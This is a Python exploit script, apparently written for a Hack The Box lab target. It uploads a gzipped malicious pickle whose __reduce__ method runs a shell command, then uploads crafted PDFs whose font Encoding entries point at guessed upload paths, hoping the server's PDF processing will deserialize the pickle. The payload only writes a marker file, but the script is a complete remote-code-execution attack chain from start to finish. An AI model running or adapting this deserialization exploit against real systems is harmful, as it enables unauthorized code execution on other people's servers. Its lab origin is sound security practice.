#!/usr/bin/env python3
import requests
import gzip
import pickle
import time
import os
import subprocess

# Create RCE that writes to multiple locations
class RCE:
    def __reduce__(self):
        import subprocess
        cmd = "touch /tmp/rce_from_pickle && echo PWNED > /tmp/rce_from_pickle"
        return (subprocess.call, (['sh', '-c', cmd],))

payload = RCE()
pickled = pickle.dumps(payload)
pickle_gz = gzip.compress(pickled)

s = requests.Session()

# Upload pickle
with open('/tmp/cwd_test.pickle.gz', 'wb') as f:
    f.write(pickle_gz)
r = s.post('http://research.bedside.htb/',
           files={'uploadFile': ('cwd_test.pickle.gz', pickle_gz)})
print(f'[+] Pickle upload: {r.status_code}')

# Create PDFs referencing different paths
pdf_paths = [
    '/uploads/cwd_test',
    '/var/www/html/uploads/cwd_test',
    '/app/uploads/cwd_test',
    'uploads/cwd_test',
]

for i, path in enumerate(pdf_paths):
    pdf_content = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/Resources 4 0 R/MediaBox[0 0 612 792]/Contents 5 0 R>>endobj
4 0 obj<</Font<</F1 6 0 R>>>>endobj
5 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Test) Tj ET
endstream endobj
6 0 obj<</Type/Font/Subtype/Type0/BaseFont/Test/Encoding {path} /DescendantFonts[7 0 R]>>endobj
7 0 obj<</Type/FontDescriptor/FontName/Test>>endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000214 00000 n
0000000262 00000 n
0000000344 00000 n
0000000451 00000 n
trailer<</Size 8/Root 1 0 R>>startxref 524
%%EOF"""

    with open(f'/tmp/test{i}.pdf', 'wb') as f:
        f.write(pdf_content.encode())

    with open(f'/tmp/test{i}.pdf', 'rb') as f:
        r = s.post('http://research.bedside.htb/',
                   files={'uploadFile': (f'test{i}.pdf', f)})
    print(f'[+] PDF {i} ({path}): {r.status_code}')

print("[*] Waiting 3 seconds for processing...")
time.sleep(3)

# Check if marker was created
result = subprocess.run(['ls', '-la', '/tmp/rce_from_pickle'], capture_output=True, text=True)
if result.returncode == 0:
    print("[!!!] SUCCESS - RCE executed!")
    print(result.stdout)
    with open('/tmp/rce_from_pickle') as f:
        print(f.read())
else:
    print("[-] No marker file found - exploit may not have triggered")
    print("Checking /tmp for any new files...")
    subprocess.run(['ls', '-ltra', '/tmp'], check=False)
